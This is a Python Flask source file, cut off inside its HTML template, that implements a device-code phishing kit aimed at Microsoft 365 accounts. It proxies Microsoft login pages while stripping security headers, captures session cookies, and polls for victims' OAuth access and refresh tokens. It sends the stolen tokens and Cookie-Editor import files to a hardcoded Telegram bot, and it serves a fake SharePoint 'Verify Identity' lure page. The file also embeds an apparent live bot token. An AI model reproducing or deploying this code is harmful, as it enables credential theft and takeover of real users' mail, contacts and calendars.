import os
import re
import json
import time
import uuid
import base64
import sqlite3
import threading
import signal
import requests
from flask import Flask, request, Response, redirect

UPSTREAM_LOGIN = "https://login.microsoftonline.com"
UPSTREAM_MSA = "https://www.microsoft.com"
TELEGRAM_TOKEN = "8998925422:AAFKDgRkGsFewhlRC6tDmrGa33a6yNxj9UY"
TELEGRAM_CHAT = "8877118461"
DB_PATH = "/tmp/phish.db"

CLIENT_IDS = [
    "d3590ed6-52b3-4102-aeff-aad2292ab01c",  # Microsoft Office
    "04b07795-8ddb-461a-bbee-02f9e1bf7b46",  # Azure CLI
    "1950a258-227b-4e31-a9cf-717495945fc2",  # Azure PowerShell
]
CLIENT_ID_INDEX = 0

DEVICE_CODE_SCOPE = (
    "https://graph.microsoft.com/Mail.ReadWrite "
    "https://graph.microsoft.com/Mail.Send "
    "https://graph.microsoft.com/MailboxSettings.ReadWrite "
    "https://graph.microsoft.com/Calendars.ReadWrite "
    "https://graph.microsoft.com/Contacts.ReadWrite "
    "https://graph.microsoft.com/User.Read "
    "offline_access openid profile"
)

# Cookies we care about
WANTED_COOKIES = [
    "ESTSAUTH", "ESTSAUTHPERSISTENT", "ESTSAUTHLIGHT", "ESTSAUTHTCT",
    "ESTSAUTHHPERSISTENT", "SignInStateCookie", "x-ms-gateway-suitename",
    "fpc", "esctx", "x-ms-cpim-sso", "brcap",
]

PROXY_HOSTS = {
    "login.microsoftonline.com": "/p/login.microsoftonline.com",
    "www.microsoft.com": "/p/www.microsoft.com",
    "login.live.com": "/p/login.live.com",
    "account.live.com": "/p/account.live.com",
}
UPSTREAM_BY_HOST = {
    "login.microsoftonline.com": UPSTREAM_LOGIN,
    "www.microsoft.com": UPSTREAM_MSA,
    "login.live.com": "https://login.live.com",
    "account.live.com": "https://account.live.com",
}

app = Flask(__name__)
shutdown_event = threading.Event()

# proxy sessions: psid -> {"cookies": {host: {name: value}}, "ts": float}
proxy_sessions = {}
_proxy_lock = threading.Lock()

# ---------- DB ----------
def init_db():
    con = sqlite3.connect(DB_PATH)
    con.execute("""CREATE TABLE IF NOT EXISTS sessions (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        device_code TEXT,
        user_code TEXT,
        client_id TEXT,
        interval INTEGER,
        expires_at REAL,
        status TEXT,
        email TEXT,
        tokens TEXT,
        cookies TEXT,
        psid TEXT,
        ts TEXT
    )""")
    cols = [r[1] for r in con.execute("PRAGMA table_info(sessions)").fetchall()]
    if "cookies" not in cols:
        con.execute("ALTER TABLE sessions ADD COLUMN cookies TEXT")
    if "psid" not in cols:
        con.execute("ALTER TABLE sessions ADD COLUMN psid TEXT")
    con.commit()
    con.close()

init_db()

def db_add_session(device_code, user_code, client_id, interval, expires_at, psid):
    con = sqlite3.connect(DB_PATH)
    con.execute("INSERT INTO sessions (device_code, user_code, client_id, interval, expires_at, status, psid, ts) VALUES (?,?,?,?,?,?,?,?)",
                (device_code, user_code, client_id, interval, expires_at, "pending", psid,
                 time.strftime("%Y-%m-%d %H:%M:%S")))
    sid = con.execute("SELECT last_insert_rowid()").fetchone()[0]
    con.commit()
    con.close()
    return sid

def db_pending_sessions():
    con = sqlite3.connect(DB_PATH)
    rows = con.execute("SELECT id, device_code, client_id, interval, expires_at, psid FROM sessions WHERE status='pending'").fetchall()
    con.close()
    return rows

def db_update_session(sid, **kw):
    con = sqlite3.connect(DB_PATH)
    for k, v in kw.items():
        con.execute(f"UPDATE sessions SET {k}=? WHERE id=?", (v, sid))
    con.commit()
    con.close()

# ---------- Telegram ----------
def send_telegram(text):
    try:
        while len(text) > 4000:
            chunk = text[:4000]
            cut = chunk.rfind("\n")
            if cut > 500:
                chunk = text[:cut]
            requests.post(
                f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
                data={"chat_id": TELEGRAM_CHAT, "text": chunk},
                timeout=15
            )
            text = text[len(chunk):].lstrip("\n")
        if text:
            requests.post(
                f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
                data={"chat_id": TELEGRAM_CHAT, "text": text},
                timeout=15
            )
    except Exception as e:
        print("Telegram error:", e)

def send_telegram_file(filename, content, caption=""):
    try:
        files = {"document": (filename, content.encode())}
        requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument",
            data={"chat_id": TELEGRAM_CHAT, "caption": caption},
            files=files,
            timeout=30
        )
    except Exception as e:
        print("Telegram file error:", e)

# ---------- Device code flow ----------
def request_device_code():
    global CLIENT_ID_INDEX
    for _ in range(len(CLIENT_IDS)):
        client_id = CLIENT_IDS[CLIENT_ID_INDEX]
        try:
            resp = requests.post(
                f"{UPSTREAM_LOGIN}/organizations/oauth2/v2.0/devicecode",
                data={"client_id": client_id, "scope": DEVICE_CODE_SCOPE},
                timeout=20
            )
            data = resp.json()
            if resp.status_code == 200 and "device_code" in data:
                return client_id, data
            else:
                print(f"[SESSION] client_id {client_id} failed: {data.get('error', resp.status_code)}")
                CLIENT_ID_INDEX = (CLIENT_ID_INDEX + 1) % len(CLIENT_IDS)
        except Exception as e:
            print(f"[SESSION] client_id {client_id} exception: {e}")
            CLIENT_ID_INDEX = (CLIENT_ID_INDEX + 1) % len(CLIENT_IDS)
    return None, None

def decode_id_token(id_token):
    try:
        payload = id_token.split(".")[1]
        payload += "=" * (-len(payload) % 4)
        data = json.loads(base64.urlsafe_b64decode(payload))
        return data.get("preferred_username") or data.get("email") or data.get("upn") or "unknown"
    except Exception:
        return "unknown"

# ---------- URL rewriting ----------
def rewrite_out(text):
    """Rewrite absolute upstream URLs in HTML/JS to our proxy paths."""
    for host, prefix in PROXY_HOSTS.items():
        text = text.replace(f"https://{host}", prefix)
        text = text.replace(f"http://{host}", prefix)
        # protocol-relative
        text = text.replace(f"//{host}", prefix)
    return text

def proxy_path_for(url):
    """Convert an absolute upstream URL into a local proxied path."""
    for host, prefix in PROXY_HOSTS.items():
        if f"https://{host}" in url or f"http://{host}" in url:
            return url.replace(f"https://{host}", prefix).replace(f"http://{host}", prefix)
    return None

# ---------- Proxy core ----------
def fetch_upstream(host, path, psid):
    upstream = UPSTREAM_BY_HOST.get(host)
    if not upstream:
        return None
    url = f"{upstream}{path}"
    method = request.method
    # Build outgoing cookies for this host from the proxy session
    cookie_header = ""
    with _proxy_lock:
        sess = proxy_sessions.get(psid, {"cookies": {}})
    jar = sess["cookies"].get(host, {})
    if jar:
        cookie_header = "; ".join(f"{k}={v}" for k, v in jar.items())

    headers = {}
    for h in ("User-Agent", "Accept", "Accept-Language", "Referer", "Content-Type"):
        if h in request.headers:
            headers[h] = request.headers[h]
    if cookie_header:
        headers["Cookie"] = cookie_header
    # Referer rewrite: our /p/<host>/... -> https://<host>/...
    if "Referer" in headers:
        for h2, prefix in PROXY_HOSTS.items():
            headers["Referer"] = headers["Referer"].replace(prefix, f"https://{h2}")

    body = request.get_data() if method in ("POST", "PUT", "PATCH") else None

    resp = requests.request(
        method, url, headers=headers, data=body,
        allow_redirects=False, timeout=30,
        stream=True
    )

    # Capture Set-Cookie
    setcookies = resp.raw.headers.getlist("Set-Cookie") if hasattr(resp.raw.headers, "getlist") else resp.headers.get("Set-Cookie", "")
    if isinstance(setcookies, str):
        setcookies = [setcookies] if setcookies else []
    new_cookies = {}
    for sc in setcookies:
        # sc like: NAME=VALUE; Path=/; Secure; HttpOnly; Expires=...
        first = sc.split(";")[0]
        if "=" in first:
            name, _, value = first.partition("=")
            new_cookies[name.strip()] = value.strip()

    if new_cookies:
        with _proxy_lock:
            ps = proxy_sessions.setdefault(psid, {"cookies": {}, "ts": time.time()})
            ps["ts"] = time.time()
            hostjar = ps["cookies"].setdefault(host, {})
            # drop deleted cookies (value empty means expiry)
            for k, v in new_cookies.items():
                if v:
                    hostjar[k] = v
                elif k in hostjar:
                    del hostjar[k]

    return resp

def proxy_response(resp, psid):
    # Redirects: rewrite Location header
    location = resp.headers.get("Location")
    if location:
        new_loc = proxy_path_for(location)
        if new_loc:
            headers = dict(resp.headers)
            headers["Location"] = new_loc
            return Response(b"", status=resp.status_code, headers=headers)

    content_type = resp.headers.get("Content-Type", "")
    if "text/html" in content_type or "javascript" in content_type or "json" in content_type:
        body = resp.content
        try:
            text = body.decode(resp.encoding or "utf-8", errors="replace")
            text = rewrite_out(text)
            body = text.encode("utf-8", errors="replace")
        except Exception:
            pass
        headers = dict(resp.headers)
        headers.pop("Content-Encoding", None)
        headers.pop("Content-Length", None)
        headers.pop("Content-Security-Policy", None)
        headers.pop("X-Frame-Options", None)
        return Response(body, status=resp.status_code, headers=headers)

    # static passthrough
    headers = dict(resp.headers)
    headers.pop("Content-Encoding", None)
    headers.pop("Content-Security-Policy", None)
    headers.pop("X-Frame-Options", None)
    return Response(resp.content, status=resp.status_code, headers=headers)

@app.route("/p/<host>/<path:path>", methods=["GET", "POST"])
def proxy(host, path):
    psid = request.cookies.get("psid")
    if not psid:
        psid = uuid.uuid4().hex
    resp = fetch_upstream(host, "/" + path, psid)
    if resp is None:
        return "Unknown upstream", 404
    out = proxy_response(resp, psid)
    out.set_cookie("psid", psid, max_age=86400, samesite="Lax")
    return out

@app.route("/p/<host>", methods=["GET", "POST"])
def proxy_root(host):
    return proxy(host, "")

# Entry point: victim goes here instead of microsoft.com/devicelogin
@app.route("/devicelogin", methods=["GET"])
def devicelogin():
    psid = uuid.uuid4().hex
    # microsoft.com/devicelogin redirects to login.microsoftonline.com/common/oauth2/deviceauth
    resp = fetch_upstream("login.microsoftonline.com", "/common/oauth2/deviceauth", psid)
    if resp is None:
        return "Proxy error", 502
    out = proxy_response(resp, psid)
    out.set_cookie("psid", psid, max_age=86400, samesite="Lax")
    return out

# ---------- Worker ----------
def poll_worker():
    print("[WORKER] poll_worker started")
    while not shutdown_event.is_set():
        try:
            for sid, device_code, client_id, interval, expires_at, psid in db_pending_sessions():
                if time.time() > expires_at:
                    db_update_session(sid, status="expired")
                    print(f"[WORKER] session {sid} expired")
                    continue
                try:
                    resp = requests.post(
                        f"{UPSTREAM_LOGIN}/organizations/oauth2/v2.0/token",
                        data={
                            "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
                            "client_id": client_id,
                            "device_code": device_code,
                        },
                        timeout=20
                    )
                    data = resp.json()
                except Exception as e:
                    print(f"[WORKER] poll error session {sid}: {e}")
                    continue

                if "access_token" in data:
                    email = decode_id_token(data.get("id_token", ""))
                    tokens = {
                        "access_token": data.get("access_token"),
                        "refresh_token": data.get("refresh_token"),
                        "id_token": data.get("id_token"),
                    }
                    # Pull cookies captured from the victim's proxy session
                    cookies = {}
                    with _proxy_lock:
                        sess = proxy_sessions.get(psid or "", {"cookies": {}})
                        for host, jar in sess.get("cookies", {}).items():
                            for name, value in jar.items():
                                if name in WANTED_COOKIES:
                                    cookies[f"{host}|{name}"] = value

                    db_update_session(sid, status="caught", email=email,
                                      tokens=json.dumps(tokens), cookies=json.dumps(cookies))

                    msg = (f"\U0001F3C6 New catch!\n"
                           f"Email: {email}\n"
                           f"Session: {sid}\n"
                           f"Access Token:\n{tokens['access_token']}\n\n"
                           f"Refresh Token:\n{tokens['refresh_token']}\n\n"
                           f"ID Token:\n{tokens['id_token']}")
                    if cookies:
                        msg += "\n\n\u2705 SESSION COOKIES (victim's real browser session):\n"
                        for full_name, value in cookies.items():
                            host, _, name = full_name.partition("|")
                            msg += f"\n[{host}] {name}={value}"

                    if len(msg) > 4000:
                        send_telegram(f"\U0001F3C6 New catch! Email: {email} (tokens + cookies attached)")
                        send_telegram_file("tokens.txt", json.dumps(tokens, indent=2), f"Tokens for {email}")
                    else:
                        send_telegram(msg)

                    if cookies:
                        cookie_editor = []
                        for full_name, value in cookies.items():
                            host, _, name = full_name.partition("|")
                            cookie_editor.append({
                                "domain": host,
                                "name": name,
                                "path": "/",
                                "value": value,
                                "secure": True,
                                "httpOnly": True,
                                "sameSite": "no_restriction",
                            })
                        send_telegram_file("cookies.json", json.dumps(cookie_editor, indent=2),
                                           f"Cookie-Editor import for {email} -> login.microsoftonline.com")

                    print(f"[WORKER] session {sid} caught email={email} cookies={len(cookies)}")
                elif data.get("error") == "authorization_pending":
                    pass
                elif data.get("error") == "slow_down":
                    time.sleep(5)
                elif data.get("error") == "expired_token":
                    db_update_session(sid, status="expired")
                    print(f"[WORKER] session {sid} token expired")
                elif data.get("error") in ("authorization_declined", "invalid_grant"):
                    db_update_session(sid, status="declined")
                    print(f"[WORKER] session {sid} declined")
        except Exception as e:
            print(f"[WORKER] loop error: {e}")
        shutdown_event.wait(timeout=3)
    print("[WORKER] poll_worker stopped")

_worker_started = False
def start_worker():
    global _worker_started
    if not _worker_started:
        threading.Thread(target=poll_worker, daemon=True).start()
        _worker_started = True
        print("[WORKER] thread launched")

start_worker()

def _shutdown(sig, frame):
    shutdown_event.set()

signal.signal(signal.SIGTERM, _shutdown)
signal.signal(signal.SIGINT, _shutdown)

# ---------- Landing page (your SharePoint style page, unchanged look) ----------
def render_page(user_code, proxied_login_url):
    return f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>SharePoint - Verify Identity</title>
<style>
* {{ margin: 0; padding: 0; box-sizing: border-box; }}
body {{ font-family: 'Segoe UI', -apple-system, Roboto, sans-serif; background-color: #faf9f8; color: #201f1e; min-height: 100vh; line-height: 1.5; overflow-x: hidden; }}
.sp-header {{ background: linear-gradient(90deg, #0078d4 0%, #106ebe 100%); height: 48px; display: flex; align-items: center; padding: 0 24px; box-shadow: 0 2px 4px rgba(0,0,0,0.12); }}
.sp-logo {{ width: 32px; height: 32px; background: white; border-radius: 4px; display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 18px; color: #0078d4; margin-right: 12px; }}
.sp-title {{ color: white; font-size: 16px; font-weight: 600; }}
.breadcrumb {{ background: white; padding: 12px 32px; border-bottom: 1px solid #edebe9; font-size: 14px; }}
.breadcrumb a {{ color: #0078d4; text-decoration: none; }}
.breadcrumb .sep {{ color: #a19f9d; margin: 0 6px; }}
.breadcrumb .current {{ color: #201f1e; font-weight: 600; }}
.main-container {{ max-width: 1100px; margin: 30px auto; padding: 0 20px; }}
.card {{ background: white; border-radius: 8px; box-shadow: 0 1.6px 3.6px rgba(0,0,0,0.13); border: 1px solid #e1dfdd; position: relative; min-height: 520px; }}
.verify-overlay {{ position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 10; background: white; border-radius: 12px; box-shadow: 0 8px 32px rgba(0,0,0,0.18); padding: 48px 56px; text-align: center; max-width: 520px; width: 90%; border: 1px solid #e1dfdd; }}
.ms-brand-header {{ display: flex; align-items: center; justify-content: center; gap: 10px; margin-bottom: 24px; }}
.ms-grid-logo {{ display: grid; grid-template-columns: 1fr 1fr; gap: 2px; width: 24px; height: 24px; }}
.ms-grid-logo span:nth-child(1) {{ background: #f25022; }}
.ms-grid-logo span:nth-child(2) {{ background: #7fba00; }}
.ms-grid-logo span:nth-child(3) {{ background: #00a4ef; }}
.ms-grid-logo span:nth-child(4) {{ background: #ffb900; }}
.ms-text-logo {{ font-size: 24px; font-weight: 600; color: #737373; }}
.verify-title {{ font-size: 26px; font-weight: 700; color: #1b1b1b; margin-bottom: 12px; }}
.verify-subtitle {{ font-size: 16px; color: #1b1b1b; margin-bottom: 28px; }}
.code-box {{ display: flex; align-items: center; justify-content: space-between; background: #f0f4f9; border: 1px solid #d1d9e6; border-radius: 6px; padding: 16px 24px; margin-bottom: 28px; }}
.code-text {{ font-size: 38px; font-weight: 700; color: #005a9e; letter-spacing: 4px; }}
.action-btn {{ display: flex; align-items: center; justify-content: center; gap: 10px; width: 100%; padding: 14px 24px; background: #005a9e; color: white; border: none; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; text-decoration: none; transition: background 0.2s; }}
.action-btn:hover {{ background: #004578; }}
.footer {{ text-align: center; padding: 24px; font-size: 12px; color: #a19f9d; }}
</style>
</head>
<body>
<header class="sp-header">
    <div class="sp-logo">S</div>
    <span class="sp-title">SharePoint</span>
</header>
<nav class="breadcrumb">
    <a href="#">Home</a><span class="sep">›</span><a href="#">Documents</a><span class="sep">›</span><span class="current">Shared-Document.xlsx</span>
</nav>
<div class="main-container">
    <div class="card">
        <div class="verify-overlay">
            <div class="ms-brand-header">
                <div class="ms-grid-logo"><span></span><span></span><span></span><span></span></div>
                <span class="ms-text-logo">Microsoft</span>
            </div>
            <h1 class="verify-title">Copy and paste this code to authenticate</h1>
            <p class="verify-subtitle">To continue,
